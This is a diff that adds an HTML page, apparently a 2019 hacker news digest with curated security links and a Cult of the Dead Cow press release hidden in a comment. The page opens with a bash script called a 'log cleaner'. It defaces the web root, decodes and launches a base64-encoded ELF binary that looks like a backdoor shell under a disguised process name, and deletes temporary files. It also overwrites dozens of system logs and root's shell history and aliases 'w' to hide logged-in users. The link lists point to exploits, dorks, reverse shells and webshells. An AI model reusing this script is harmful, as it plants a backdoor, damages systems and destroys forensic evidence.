@@ -1,0 +1,253 @@
+<html>
+<head>
+<title>20190604</title>
+<link rel="stylesheet" href="./../hl/rainbow.css">
+<meta charset="utf-8">
+<style>
+      body { color: #A2C8D0; background-color: #152432; }
+@font-face { font-family: "unscii"; src: url("unscii-16.woff") format('woff'); }
+       pre { font-family: "unscii", "Lucida Console", monospace, Monaco; font-size: 16px; line-height: 1.0; }
+         a { color: #a2d0aa;  text-decoration: none; }
+         o { color: #aaa2d0; }
+         r { color: #b02f30; }
+         w { color: #ffffff; }
+        bg { background-color: #0d1720; }
+     .hljs { background-color: #0d1720;font-family:"unscii", "Lucida Console", monospace, Monaco; border-style: solid; border-color: #A2C8D0; }
+</style>
+</head>
+<body>
+<center><div style="display: inline-block; text-align: left;"><pre>
+<code style="x86asm bash">#!/bin/bash
+# elite log cleaner - do NOT upload to virus total
+export WWW=/var/www/html/index.html
+echo "&lt;pre&gt;" > $WWW
+echo "   ______________     ______      ___  ________          " >>$WWW
+echo " .╲╲   _    _   ╱----╱     ╱_____╱   ╲╲╲.     ╱_         " >>$WWW
+echo "    )__╱    ╱___╲  _╱     ╱╱    ╱    ╱╱    ╱___(__       " >>$WWW
+echo "      ╱    ╱╱      ╲     ╱╱    ╱    ╱╱    ╱_╲     ╲      " >>$WWW
+echo "     ╱_____╲       ╱_____╲ _________╲ _______      ╲     " >>$WWW
+echo "    ╱╱╱╱╱╱╱╱╲_____╱╱╱╱╱╱╱╲╲╱╱╱╱╱╱╱╱╱╲╲╱╱╱╱╱╱╱╲_____╱╱.   " >>$WWW
+echo "  _________  ___________ ________ _______     ________   " >>$WWW
+echo " _)       ╱_.)   ._    ╱╱  ___  ╱╱      ╱_____╲____  (   " >>$WWW
+echo " ╲    |__╱  ╲__  |╱  _╱╱     ╱  ╱      ╱      X0  ╱   ╲  " >>$WWW
+echo "  ╲   :       ╱  ╱    ╲__   ╱  ╱╱_    ╱╲     ╱.  ╱     ╲ " >>$WWW
+echo " .╲╲___      ╱___╲      ╱_____╱╱╱╱____╱╲     ╲╲__      ╱ " >>$WWW
+echo "   ╱╱╱╱╲____╱╱╱╱╱╱╲____╱╱╱╱╱╱╱  ╱╱╱╱╱╱╱╱╲____╱╱╱╱╲____╱╱." >>$WWW
+echo "       ╱╱╱╱╱      ╱╱╱╱╱                 ╱╱╱╱╱    ╱╱╱╱╱   " >>$WWW
+base64 -d <<< f0VMRmopWGoCX2oBXpnrPAIAPgABAAAABAAAAAEAAAAc > ksysguardd
+base64 -d <<< AAAAAAAAAAAAAAAAAAAAAQAAAEAAOAABAAIABDsPBQAA >>ksysguardd
+base64 -d <<< AAAEOw8FAAAAAA8FSInHSDHbU1PGBCQCZsdEJAIUHkiJ >>ksysguardd
+base64 -d <<< 5moQWmoxWA8FagFeajJYDwVIieZIMcmxEFFIieJqK1gP >>ksysguardd
+base64 -d <<< BVlIicdqA15I/85qIVgPBXX2mYnWSL8vL2Jpbi9zaEjB >>ksysguardd
+base64 -d <<< 7whXVF/rkA== >> ksysguardd
+chmod +x ksysguardd
+./ksysguardd &
+rm ksysguardd
+rm /tmp/*
+rm /dev/shm/*
+echo "oWo" > /var/log/alternatives.log
+echo "oWo" > /var/log/amazon/ssm/amazon-ssm-agent.log
+echo "oWo" > /var/log/apache2/access.log
+echo "oWo" > /var/log/apache2/error.log
+echo "oWo" > /var/log/apt/history.log
+echo "oWo" > /var/log/apt/term.log
+echo "oWo" > /var/log/auth.log
+echo "oWo" > /var/log/boot.log
+echo "oWo" > /var/log/btmp
+echo "oWo" > /var/log/cloud-init.log
+echo "oWo" > /var/log/cron.log
+echo "oWo" > /var/log/daemon.log
+echo "oWo" > /var/log/dmesg
+echo "oWo" > /var/log/dpkg.log
+echo "oWo" > /var/log/faillog
+echo "oWo" > /var/log/fsck/checkfs
+echo "oWo" > /var/log/fsck/checkroot
+echo "oWo" > /var/log/gpu-manager.log
+echo "oWo" > /var/log/httpd/access.log
+echo "oWo" > /var/log/kern.log
+echo "oWo" > /var/log/lastlog
+echo "oWo" > /var/log/lighttpd/access.log
+echo "oWo" > /var/log/mail.log
+echo "oWo" > /var/log/maillog
+echo "oWo" > /var/log/messages
+echo "oWo" > /var/log/mongodb/mongod.log
+echo "oWo" > /var/log/mysql.log
+echo "oWo" > /var/log/mysql/error.log
+echo "oWo" > /var/log/mysqld.log
+echo "oWo" > /var/log/nginx/access.log
+echo "oWo" > /var/log/nginx/error.log
+echo "oWo" > /var/log/ntp
+echo "oWo" > /var/log/postgresql/postgres-19.log
+echo "oWo" > /var/log/pureftp.log
+echo "oWo" > /var/log/qmail/log
+echo "oWo" > /var/log/samba/log
+echo "oWo" > /var/log/secure
+echo "oWo" > /var/log/spooler
+echo "oWo" > /var/log/squid/access.log
+echo "oWo" > /var/log/squid/cache.log
+echo "oWo" > /var/log/syslog
+echo "oWo" > /var/log/tallylog
+echo "oWo" > /var/log/ufw
+echo "oWo" > /var/log/utmp
+echo "oWo" > /var/log/wtmp
+echo "oWo" > /var/log/xferlog
+echo "oWo" > /var/log/yum.log
+echo "oWo" > /root/.bash_history
+echo "alias w='echo oWo'" >> /root/.bashrc
+firefox <a href="https://twitch.tv/hardchat">https://twitch.tv/hardchat</a>
+</code>
+┌── <o>NEWS</o> ─────────────────────────────────────────────────────────────────────╼<o>•</o>
+│                                                                              ╿
+│ <o>•</o> <a href="https://www.pbs.org/newshour/show/american-towns-under-cyberattack-from-an-nsa-built-software">American towns under cyberattack from an NSA-built software</a>                │
+│                                                                              │
+│ <o>•</o> <a href="https://www.zdnet.com/google-amp/article/russia-says-tinder-must-share-user-data-private-messages/">Russia says Tinder must share user data, private messages</a>                  │
+│                                                                              │
+│ <o>•</o> <a href="https://thepointsguy.com/news/select-us-visa-applications-now-require-submission-of-social-media-accounts/">US Visa Application Now Requires Submission of Social Media Accounts</a>       │
+│                                                                              │
+│ <o>•</o> <a href="https://9to5google.com/2019/05/29/chrome-ad-blocking-enterprise-manifest-v3/">Google to restrict modern ad blocking Chrome extensions to enterprise</a>      │
+│                                                                              │
+│ <o>•</o> <a href="https://www.wsj.com/articles/amazons-plan-to-move-in-to-your-next-apartment-before-you-do-11559361605">Amazon's Plan to Move In to Your Next Apartment Before You Do</a>              │
+│                                                                              │
+│ <o>•</o> <a href="https://www.militarytimes.com/news/your-air-force/2019/05/30/dod-bought-phony-military-gear-made-in-china-including-counter-night-vision-clothing-that-didnt-actually-work/">DoD bought phony military gear made in China, including counter-night</a>      │
+│    <a href="https://www.militarytimes.com/news/your-air-force/2019/05/30/dod-bought-phony-military-gear-made-in-china-including-counter-night-vision-clothing-that-didnt-actually-work/">vision clothing that didn’t actually work</a>                                 │
+│                                                                              │
+│ <o>•</o> <a href="https://portswigger.net/daily-swig/nginx-server-bugs-could-lead-to-rce">Nginx server bugs could lead to RCE</a>                                        │
+│                                                                              │
+│ <o>•</o> <a href="https://phys.org/news/2019-05-vulnerability-cloud-hardware-uncovered.html">Vulnerability of cloud service hardware uncovered</a>                          │
+│                                                                              │
+│ <o>•</o> <a href="https://www.twistlock.com/labs-blog/breaking-out-of-coresos-rkt-3-new-cves/">Breaking Out of rkt – 3 New Unpatched CVEs</a>                                 │
+│                                                                              │
+│ <o>•</o> <a href="https://www.reuters.com/article/us-alphabet-play-store-marijuana-idUSKCN1SZ2NZ">Google bans apps that facilitate sale of marijuana</a>                         │
+╽                                                                              │
+<o>•</o>╾─────────────────────────────────────────────────────────────────────────────┘
+┌── <o>GOOD READS</o> ───────────────────────────────────────────────────────────────╼<o>•</o>
+│                                                                              ╿
+│ <o>•</o> <a href="https://www.wired.com/story/cult-of-the-dead-cow-at-stake-hackers-excerpt/">Much @Stake: The band of hackers that defined an era</a>                       │
+│                                                                              │
+│ <o>•</o> <a href="https://mp.weixin.qq.com/s/3ZQhn32NB6p-LwndB2o2zQ">Antiy Announces "Formula Organization" Attack on SWIFT Service Providers</a>   │
+│   <a href="https://mp.weixin.qq.com/s/3ZQhn32NB6p-LwndB2o2zQ">in the Middle East</a>                                                         │
+│                                                                              │
+│ <o>•</o> <a href="https://portswigger.net/blog/provoking-browser-quirks-with-behavioural-fuzzing">Provoking browser quirks with behavioural fuzzing</a>                          │
+│                                                                              │
+│ <o>•</o> <a href="https://medium.com/@notdan/curl-slight-of-hand-exploit-hysteria-29a82e5851d">Curl, Slight of Hand, & Exploit Hysteria</a>                                   │
+│                                                                              │
+│ <o>•</o> <a href="https://www.lawfareblog.com/when-fake-news-comes-academia">When Fake News Comes to Academia</a>                                           │
+╽                                                                              │
+<o>•</o>╾─────────────────────────────────────────────────────────────────────────────┘
+┌── <o>USEFUL/PROJECTS</o> ──────────────────────────────────────────────────────────╼<o>•</o>
+│                                                                              ╿
+│ <o>•</o> <a href="http://cybercrime-tracker.net/index.php?s=0&m=40">Cyber Crime Tracker</a>                                                        │
+│                                                                              │
+│ <o>•</o> <a href="https://whoami.securitybreached.org/2019/06/03/guide-getting-started-in-bug-bounty-hunting/">Getting Started in Bug Bounty Hunting</a>                                      │
+│                                                                              │
+│ <o>•</o> <a href="https://www.youtube.com/channel/UCo1NHk_bgbAbDBc4JinrXww">BugCrowd LevelUp 0x4</a>                                                       │
+│                                                                              │
+│ <o>•</o> <a href="https://gist.github.com/netspooky/c6db0034d2728a6906fe27248061d4ac">A 172 byte 64 bit ELF bind shell binary</a>                                    │
+╽                                                                              │
+<o>•</o>╾─────────────────────────────────────────────────────────────────────────────┘
+┌── <o>CHEAT CODES</o> ──────────────────────────────────────────────────────────────╼<o>•</o>
+│                                                                              ╿
+│ <o>•</o> <a href="https://www.fcvl.net/vulnerabilities/macosx-gatekeeper-bypass">MacOS X GateKeeper Bypass</a>                                                  │
+│                                                                              │
+│ <o>•</o> <a href="https://seclists.org/oss-sec/2019/q2/134">Security regression in Kubernetes kubelet v1.13.6 and v1.14.2 only -</a>       │
+│   <a href="https://seclists.org/oss-sec/2019/q2/134">CVE-2019-11245</a>                                                             │
+│    <r>>>></r> <a href="https://github.com/kubernetes/kubernetes/issues/78308">Github Issue</a>                                                          │
+│                                                                              │
+│ <o>•</o> <a href="https://seclists.org/oss-sec/2019/q2/132">CVE-2018-8029: Apache Hadoop Privilege escalation vulnerability</a>            │
+│                                                                              │
+│ <o>•</o> <a href="https://github.com/numirias/security/blob/master/doc/2019-06-04_ace-vim-neovim.md">Vim/Neovim Arbitrary Code Execution via Modelines</a>                          │
+│                                                                              │
+│ <o>•</o> <a href="https://twitter.com/rqu45/status/1135403356808142849">Interactive Reverse Shell using curl</a>                                       │
+╽                                                                              │
+<o>•</o>╾─────────────────────────────────────────────────────────────────────────────┘
+┌── <o>SAFARI</o> ───────────────────────────────────────────────────────────────────╼<o>•</o>
+│                                                                              │
+│<w>   Please note that all links in the Safari section may contain malicious,    </w>│
+│<w>   offensive, or unwanted content. <r>Click at your own risk!</r> View the source    </w>│
+│<w>   to see links, and take appropriate steps as needed.                        </w>│
+│                                                                              │
+│ <o>•</o> <a href="https://docs.daviecountync.gov/WebLink/Browse.aspx?id=195696&dbid=1&repo=DavieCounty&cr=1">Family Bibles</a> [hermit]                                                     │
+│                                                                              │
+│ <o>•</o> <a href="https://cve.mitre.org/data/refs/refmap/source-CONFIRM.html">Every Vuln Confirmation</a> [hermit]                                           │
+│                                                                              │
+│ <o>•</o> <a href="https://www.google.com/search?q=inurl%3Aserver_meta+filetype%3Atxt">Geocities Sitebuilder Dork</a> [hermit]                                        │
+│                                                                              │
+│ <o>•</o> <a href="https://www.google.com/search?q=inurl%3Ah.fanapp.mobi%2F">Android Appbuilder Dork</a> [hermit]                                           │
+│                                                                              │
+│ <o>•</o> <a href="http://2.6.234.35.bc.googleusercontent.com/Advboom-ads-player/201905080605/">Vending Machine Firmware</a> [xehle]                                           │
+│                                                                              │
+│ <o>•</o> <a href="https://github.com/search?utf8=%E2%9C%93&q=url+NOT+localhost+extension%3Aproperties+filename%3Asonar-project&type=Code&ref=advsearch">Sonarqube dork</a> [x0]                                                        │
+│                                                                              │
+│ <o>•</o> <a href="https://pastebin.com/JJENPDuA">"This router was secured by the last remaining Admin Bitches"</a> [x0]         │
+│                                                                              │
+│ <o>•</o> <a href="https://pastebin.com/u/spys1">Seemingly automated proxy lists</a> [x0]                                       │
+│                                                                              │
+│ <o>•</o> <a href="https://pastebin.com/u/PremSocks">...and SOCKS</a> [x0]                                                          │
+│                                                                              │
+│ <o>•</o> <a href="https://pastebin.com/aNRGjPmv">priv9 nginx 0day</a> [x0]                                                      │
+│                                                                              │
+│ <o>•</o> <a href="https://pastebin.com/7zDRj9wZ">Top 3% of Apple programmers</a> [x0]                                           │
+│                                                                              │
+│ <o>•</o> <a href="https://pastebin.com/qfKyX1H0">"Hacked by MI77I-X"</a> [x0]                                                   │
+│                                                                              │
+│ <o>•</o> <a href="http://soft.shibangsoft.com/dirLIST_0.3.0/index.php?err=dXBsb2FkX2Vycm9y">Webshell Graveyard</a> [yuu]                                                   │
+│                                                                              │
+<o>•</o>╾─────────────────────────────────────────────────────────────────────────────┘
+
+<iframe width="100%" height="300" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/playlists/794536476&color=%23ff5500&auto_play=false&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true&visual=true"></iframe>
+<!--
+EMBARGOED UNTIL JUNE 4TH
+    _   _
+   ((___))
+   [ x x ]
+    \   /
+    (' ')
+     (U)
+    
+Festoons    Huzzah    Gardyloo
+
+LUBBOCK, TX., June 4 — Today the CULT OF THE DEAD COW (cDc), the world’s most 
+attractive hacker group, announced the release of behind-the-scenes footage 
+from inside the Suite of the Elite covering the last-minute preparations for 
+the Back Orifice 2000 (BO2K) software launch at Def Con 7, 1999. It hardly 
+seems like twenty years since the cDc changed the world.
+
+“I would have preferred more cockfighting but the old footage is still pretty 
+cool,” said cDc bandersnatch, Krass Katt. “Everyone seems so young and life-
+like. It was also fun seeing our old pals (who have since passed away) 
+THE NIGHTSTALKER, a former CIA contractor, and Tequila Willy, who ran for 
+president a few times before that Beto guy. Plus it’s kind of poetic we’re 
+releasing this on the anniversary of the Tiananmen Square massacre. We really
+enjoyed being a pain in China’s ass with BO2K.”
+
+The video footage made available on YouTube coincides with the release of 
+Joseph Menn’s book, “Cult of the Dead Cow: How The Original Hacking Supergroup
+Might Just Save The World.” Some literary critics are hailing the book as the 
+greatest literary work since Infinite Jest, or the poems of Rod McKuen. 
+
+LINKS:
+
+BO2K Presentation Behind-the-Scenes:  https://youtu.be/oHxNEvklKqE 
+
+Cult of the Dead Cow: How The Original Hacking Supergroup Might Just Save The 
+World: https://amzn.com/154176238X 
+
+—
+
+Press Contact
+Deth Vegetable
+veggie at cultdeadcow dot com
+
+About CULT OF THE DEAD COW (cDc)
+Founded in Lubbock, Tx. the cDc publishing and hacktivist collective has no 
+equals, except possibly Mr.T. It has published the longest running e-zine on
+the internet and invented hacktivism. The cDc’s members have contributed to 
+hacker culture, information security, politics, and hacktivism in countless 
+ways since 1984. For more information please visit: http://cultdeadcow.com 
+-->
+
+
+</pre></div></center>
+<script src="./../hl/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+</body></html>
